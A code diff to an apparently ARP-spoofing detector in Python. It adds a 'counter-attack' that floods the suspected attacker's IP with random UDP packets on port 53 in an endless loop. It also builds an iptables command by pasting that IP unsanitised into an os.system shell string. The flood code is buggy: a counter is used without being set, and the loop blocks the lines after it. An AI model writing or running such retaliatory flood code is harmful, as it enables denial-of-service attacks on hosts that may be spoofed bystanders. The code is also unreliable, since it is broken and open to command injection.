@@ -4,6 +4,8 @@ import Queue
 import collections
 import ConfigParser
 import os
+import socket
+import random
 import gi
 gi.require_version('Notify', '0.7')
 from gi.repository import Notify
@@ -69,8 +71,13 @@ def notif(msg):
     logging.info(msg)
 
 
-def attack(msg):
-    print(msg)
+def attack(ip, port=53):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1024)
+
+    while 1:
+        sock.sendto(bytes, (ip, port))
+        sent= sent + 1
 
 
 def main():
@@ -114,7 +121,7 @@ def main():
         if cpt > 5 and not is_attacked:
             attack(spoof_info['attacker_ip'])
             notif('The attacker was counter-attacked ! ')
-            os.system('arptables -A INPUT -s %s -j DROP' % spoof_info['attacker_ip'])
+            os.system('iptables -I INPUT -s %s -j DROP' % spoof_info['attacker_ip'])
             notif('Your are now protected from the attacker %s' % spoof_info['attacker_ip'])
             is_attacked = True
 
